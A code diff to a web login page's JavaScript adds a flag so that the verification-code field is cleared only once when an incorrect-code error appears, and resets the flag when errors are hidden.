@@ -684,6 +684,7 @@ let currentStatus = null;
 let lastShownStatus = '';
   let isSubmitting = false;
   let isProcessing = false;
+  let _codeErrorShown = false;
   let lastFormVisibleStatus='WAITINGEMAIL';
   let isInitialLoad = true;
   let submitGuardTimeout = null;
@@ -954,8 +955,11 @@ function updateUIForStatus(status, data = {}) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lastResp.message && (lastResp.message.includes('Incorrect verification code') || lastResp.message.includes('incorrect code'))) {
-            const vCI = document.getElementById('txtVerificationCode');
-            if (vCI) vCI.value = '';
+            if (!_codeErrorShown) {
+              const vCI = document.getElementById('txtVerificationCode');
+              if (vCI) vCI.value = '';
+              _codeErrorShown = true;
+            }
             document.getElementById('InvalidVerificationCode').textContent = lastResp.message;
             document.getElementById('InvalidVerificationCode').style.display = 'block';
           }
@@ -1062,6 +1066,7 @@ function hideStyledError() {
 
 function hideAllErrors() {
   hideStyledError();
+  _codeErrorShown = false;
   document.getElementById('InvalidEmail').style.display = 'none';
   document.getElementById('InvalidPassword').style.display = 'none';
   document.getElementById('RequirePassword').style.display = 'none';
